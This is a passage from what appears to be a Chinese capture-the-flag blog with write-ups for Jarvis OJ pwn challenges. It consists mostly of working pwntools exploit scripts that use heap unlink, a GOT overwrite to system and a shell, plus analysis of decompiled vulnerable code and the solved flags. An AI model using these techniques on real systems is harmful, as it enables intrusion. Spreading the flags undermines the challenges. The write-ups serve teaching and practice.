class="number">8</span>,p64(system))</span><br><span class="line">cn.sendline(<span class="string">"$0"</span>)</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">chunk_list:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x603000:   0x0000000000000000  0x0000000000001821</span></span><br><span class="line"><span class="string">0x603010:   0x0000000000000100  0x0000000000000001</span></span><br><span class="line"><span class="string">0x603020:   0x0000000000000001  0x000000000000000a</span></span><br><span class="line"><span class="string">0x603030:   0x0000000000604830  0x0000000000000000 &lt;- ptr here</span></span><br><span class="line"><span class="string">0x603040:   0x0000000000000000  0x0000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<p>先创建5个0x80的chunk，然后free 3号和1号（注意顺序）。这样1号chunk的fd就指向了3号，就是我们等下需要leak的堆地址。</p>
<p>由于1号free了，我们就能通过edit函数的realloc，扩大chunk0到chunk1上，注意此时edit输入的size要为0x90而不是0x100，因为上面的代码中的<code>read_n_bytes</code>函数是你size输入是多少就必须读入多少字节，所以此时是malloc(0x100)，然后写入0x90字节。刚好覆盖完chunk1的prev_size和size，通过list函数把fd打印出来，从而leak堆基地址和大chunk中chunk0的地址。</p>
<p>接着就是unlink，从而任意读和任意写，但还要注意一下size的0x80对齐就是了。</p>
<p>flag:<code>PCTF{Double_Fr33_free_Fr3e_Fre3_h4ve_Fun}</code></p>
<hr>
<h2 id="PWN-XMAN-level6"><a href="#PWN-XMAN-level6" class="headerlink" title="PWN - [XMAN]level6"></a>PWN - [XMAN]level6</h2><p>题目描述：</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9885</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/level6.rar.fbf2e2c84e0371082703e2753a3bc514" target="_blank" rel="noopener">level6.rar.fbf2e2c84e0371082703e2753a3bc514</a></p>
</blockquote>
<p>不多说，这题就是上一题的32位版本，所有的都一样。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    cn = process(<span class="string">"./level6"</span>)</span><br><span class="line">    bin = ELF(<span class="string">"level6"</span>)</span><br><span class="line">    libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cn = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9885</span>)</span><br><span class="line">    bin = ELF(<span class="string">"level6"</span>)</span><br><span class="line">    libc = ELF(<span class="string">"libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_post</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_post</span><span class="params">(length,content)</span>:</span></span><br><span class="line">    cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Length'</span>)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(<span class="string">'Enter'</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_post</span><span class="params">(idx,length,content)</span>:</span></span><br><span class="line">    cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'number'</span>)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line">    cn.recvuntil(<span class="string">'Length'</span>)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(<span class="string">'Enter'</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_post</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'number'</span>)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">chunk_list=<span class="number">0x0804A2EC</span></span><br><span class="line">test=<span class="number">0x08048CC5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------init-------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    add_post(<span class="number">0x80</span>,str(i)*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">del_post(<span class="number">3</span>)</span><br><span class="line">del_post(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'0'</span>*<span class="number">0x80</span> + <span class="string">'a'</span>*<span class="number">0x8</span></span><br><span class="line">edit_post(<span class="number">0</span>,<span class="number">0x88</span>,pay)</span><br><span class="line"><span class="comment">#------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------leak----------</span></span><br><span class="line">cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'a'</span>*<span class="number">0x8</span>)</span><br><span class="line">leak_addr = u32(cn.recv(<span class="number">4</span>))</span><br><span class="line">cn.recv()</span><br><span class="line">heap_base = leak_addr - <span class="number">0xdb0</span><span class="comment">#offset</span></span><br><span class="line">chunk0_addr = heap_base + <span class="number">0x18</span></span><br><span class="line">success(<span class="string">"leak_addr: "</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">"heap_base: "</span>+hex(heap_base))</span><br><span class="line">success(<span class="string">"chunk0_addr: "</span>+hex(chunk0_addr))</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------unlink--------</span></span><br><span class="line">pay = p32(<span class="number">0x88</span>) + p32(<span class="number">0x80</span>) + p32(chunk0_addr<span class="number">-0xc</span>) + p32(chunk0_addr<span class="number">-0x8</span>) + <span class="string">'0'</span>*(<span class="number">0x80</span><span class="number">-4</span>*<span class="number">4</span>)</span><br><span class="line">pay += p32(<span class="number">0x80</span>) + p32(<span class="number">0x88</span>+<span class="number">0x88</span>)</span><br><span class="line">edit_post(<span class="number">0</span>,len(pay),pay)</span><br><span class="line">del_post(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------leak----------</span></span><br><span class="line">pay = p32(<span class="number">2</span>) + p32(<span class="number">1</span>) + p32(<span class="number">0x88</span>) + p32(chunk0_addr<span class="number">-0xc</span>)</span><br><span class="line">pay += p32(<span class="number">1</span>)+p32(<span class="number">0x4</span>)+p32(bin.got[<span class="string">'strtol'</span>])</span><br><span class="line">pay += <span class="string">'\x00'</span>*(<span class="number">0x88</span>-len(pay))</span><br><span class="line">edit_post(<span class="number">0</span>,len(pay),pay)</span><br><span class="line">cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'0. '</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'1. '</span>)</span><br><span class="line">strtol = cn.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>]</span><br><span class="line">cn.recv()</span><br><span class="line">strtol = u32(strtol)</span><br><span class="line">system = strtol - libc.symbols[<span class="string">'strtol'</span>]+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">"strtol: "</span>+hex(strtol))</span><br><span class="line">success(<span class="string">"system: "</span>+hex(system))</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------hijack&amp;getshell--------</span></span><br><span class="line">edit_post(<span class="number">1</span>,<span class="number">4</span>,p32(system))</span><br><span class="line">cn.sendline(<span class="string">"$0"</span>)</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<p>flag:<code>CTF{1ed0f9f23eb1df2c29149f44a597932c}</code></p>
<hr>
<h2 id="PWN-Xman-level6-x64"><a href="#PWN-Xman-level6-x64" class="headerlink" title="PWN - [Xman]level6_x64"></a>PWN - [Xman]level6_x64</h2><p>题目描述：</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9886</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/level6_x64.rar.70d1ee5db56830c021da3fbd9818a030" target="_blank" rel="noopener">level6_x64.rar.70d1ee5db56830c021da3fbd9818a030</a></p>
</blockquote>
<p>无语，这题就是上面的guestbook，改一下nc地址，libc和bin直接打过去就拿shell了，脚本部分一个字都不用改。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    cn = process(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">    bin = ELF(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cn = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9886</span>)</span><br><span class="line">    bin = ELF(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_post</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_post</span><span class="params">(length,content)</span>:</span></span><br><span class="line">    cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Length'</span>)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(<span class="string">'Enter'</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_post</span><span class="params">(idx,length,content)</span>:</span></span><br><span class="line">    cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'number'</span>)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line">    cn.recvuntil(<span class="string">'Length'</span>)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(<span class="string">'Enter'</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_post</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'number'</span>)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">chunk_list=<span class="number">0x00000000006020A8</span></span><br><span class="line">test=<span class="number">0x00000000004012E6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------init-------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    add_post(<span class="number">0x80</span>,str(i)*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">del_post(<span class="number">3</span>)</span><br><span class="line">del_post(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'0'</span>*<span class="number">0x80</span> + <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">edit_post(<span class="number">0</span>,<span class="number">0x90</span>,pay)</span><br><span class="line"><span class="comment">#------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------leak----------</span></span><br><span class="line">cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_data = cn.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>]</span><br><span class="line">cn.recv()</span><br><span class="line">leak_addr = u64(leak_data + <span class="string">'\x00'</span>*(<span class="number">8</span>-len(leak_data)))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x19d0</span><span class="comment">#offset</span></span><br><span class="line">chunk0_addr = heap_base+<span class="number">0x30</span></span><br><span class="line">success(<span class="string">"leak_addr: "</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">"heap_base: "</span>+hex(heap_base))</span><br><span class="line">success(<span class="string">"chunk0_addr: "</span>+hex(chunk0_addr))</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------unlink--------</span></span><br><span class="line">pay = p64(<span class="number">0x90</span>) + p64(<span class="number">0x80</span>) + p64(chunk0_addr<span class="number">-0x18</span>) + p64(chunk0_addr<span class="number">-0x10</span>) + <span class="string">'0'</span>*(<span class="number">0x80</span><span class="number">-8</span>*<span class="number">4</span>)</span><br><span class="line">pay += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>+<span class="number">0x90</span>) + <span class="string">'1'</span>*<span class="number">0x70</span></span><br><span class="line">success(hex(len(pay)))</span><br><span class="line">edit_post(<span class="number">0</span>,len(pay),pay)</span><br><span class="line">del_post(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------leak----------</span></span><br><span class="line">pay = p64(<span class="number">2</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x100</span>) + p64(chunk0_addr<span class="number">-0x18</span>)</span><br><span class="line">pay += p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(bin.got[<span class="string">'atoi'</span>])</span><br><span class="line">pay += <span class="string">'\x00'</span>*(<span class="number">0x100</span>-len(pay))</span><br><span class="line">edit_post(<span class="number">0</span>,len(pay),pay)</span><br><span class="line">cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'0. '</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'1. '</span>)</span><br><span class="line">atoi = cn.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>]</span><br><span class="line">cn.recv()</span><br><span class="line">atoi = u64(atoi + <span class="string">'\x00'</span>*(<span class="number">8</span>-len(atoi)))</span><br><span class="line">system = atoi - libc.symbols[<span class="string">'atoi'</span>]+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">"atoi: "</span>+hex(atoi))</span><br><span class="line">success(<span class="string">"system: "</span>+hex(system))</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------hijack&amp;getshell--------</span></span><br><span class="line">edit_post(<span class="number">1</span>,<span class="number">8</span>,p64(system))</span><br><span class="line">cn.sendline(<span class="string">"$0"</span>)</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">chunk_list:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x603000:   0x0000000000000000  0x0000000000001821</span></span><br><span class="line"><span class="string">0x603010:   0x0000000000000100  0x0000000000000001</span></span><br><span class="line"><span class="string">0x603020:   0x0000000000000001  0x000000000000000a</span></span><br><span class="line"><span class="string">0x603030:   0x0000000000604830  0x0000000000000000 &lt;- ptr here</span></span><br><span class="line"><span class="string">0x603040:   0x0000000000000000  0x0000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<p>flag:<code>CTF{de7effd8864f018660e178b96b8b4ffc}</code></p>
<hr>
<h2 id="PWN-HTTP"><a href="#PWN-HTTP" class="headerlink" title="PWN - HTTP"></a>PWN - HTTP</h2><p>题目描述</p>
<blockquote>
<p>Try it here:</p>
<p>pwn.jarvisoj.com:9881</p>
<p>题目来源：cncert2016</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/http.49cb96c66532dfb92e4879c8693436ff" target="_blank" rel="noopener">http.49cb96c66532dfb92e4879c8693436ff</a></p>
</blockquote>
<p>这题一是没有什么pwn的知识，二是有一些web的知识，我也不好回答，贴一份网上的wp吧。</p>
<p><a href="http://www.jianshu.com/p/3d3a37c3e1c7" target="_blank" rel="noopener">http://www.jianshu.com/p/3d3a37c3e1c7</a></p>
<hr>
<h2 id="PWN-ItemBoard"><a href="#PWN-ItemBoard" class="headerlink" title="PWN - ItemBoard"></a>PWN - ItemBoard</h2><p>题目描述：</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9887</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/ItemBoard.rar.3e7e05bb3f5ce04f9ea8481b0e13b070" target="_blank" rel="noopener">ItemBoard.rar.3e7e05bb3f5ce04f9ea8481b0e13b070</a></p>
</blockquote>
<p>读完代码，发现几个漏洞</p>
<p>一，new_item函数中存在stack overflow</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">new_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> cnt; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">1024</span>]; <span class="comment">// [sp+0h] [bp-410h]@1</span></span><br><span class="line">  <span class="keyword">int</span> content_len; <span class="comment">// [sp+404h] [bp-Ch]@1</span></span><br><span class="line">  Item *item; <span class="comment">// [sp+408h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  item = (Item *)<span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);               <span class="comment">// size = 0x18</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// 0x8 : char * name</span></span><br><span class="line">                                                <span class="comment">// 0x8 : char * description</span></span><br><span class="line">                                                <span class="comment">// 0x8 : void * item_free</span></span><br><span class="line">  cnt = items_cnt++;</span><br><span class="line">  item_array[cnt] = item;                       <span class="comment">// array : 0xA0(20*8)</span></span><br><span class="line">  item-&gt;name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  item-&gt;<span class="built_in">free</span> = (<span class="keyword">void</span> (*)(ItemStruct *))item_free;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"New Item"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Item name?"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read_until(<span class="number">0</span>, buf, <span class="number">0x20</span>, <span class="string">'\n'</span>);               <span class="comment">// name len : 32</span></span><br><span class="line">  <span class="built_in">strcpy</span>(item-&gt;name, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Description's len?"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  content_len = read_num();</span><br><span class="line">  item-&gt;description = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(content_len);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Description?"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read_until(<span class="number">0</span>, buf, content_len, <span class="string">'\n'</span>);        <span class="comment">// 【overflow】buf[1024],content_len 大于 1024时overflow，无canary</span></span><br><span class="line">  <span class="built_in">strcpy</span>(item-&gt;description, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Add Item Successfully!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其次，del函数中没有对free的指针赋0，产生野指针</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">remove_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which item?"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  index = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; items_cnt &amp;&amp; item_array[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(_QWORD))item_array[index]-&gt;<span class="built_in">free</span>)(item_array[index]);</span><br><span class="line">    set_null(item_array[index]);                <span class="comment">// 这个函数没有实际作用，没有清空指针【野指针】</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The item has been removed"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hacker!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而且，show函数没有检查inuse，造成leak。</p>
<p>做法：</p>
<p>创造unsortedbin并free，leak出main_arena从而得到libc基址。</p>
<p>仔细观察前面的stack overflow，其实造成了一个有指针指向的任意地址的任意写。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read_until(0, buf, content_len, &apos;\n&apos;);        // 【overflow】buf[1024],content_len 大于 1024时overflow，无canary</span><br><span class="line">strcpy(item-&gt;description, buf);</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000410 buf             db 1024 dup(?)</span><br><span class="line">-0000000000000010                 db ? ; undefined</span><br><span class="line">-000000000000000F                 db ? ; undefined</span><br><span class="line">-000000000000000E                 db ? ; undefined</span><br><span class="line">-000000000000000D                 db ? ; undefined</span><br><span class="line">-000000000000000C content_len     dd ?</span><br><span class="line">-0000000000000008 item            dq ?                    ; offset</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>overflow盖过item为p，则*(p+8) = buf，由于strcpy，有零截断。</p>
<p>这里我是通过改free_hook_ptr做的。</p>
<p>p改为free_hook_ptr-8，那么就能改写free_hook的值了。</p>
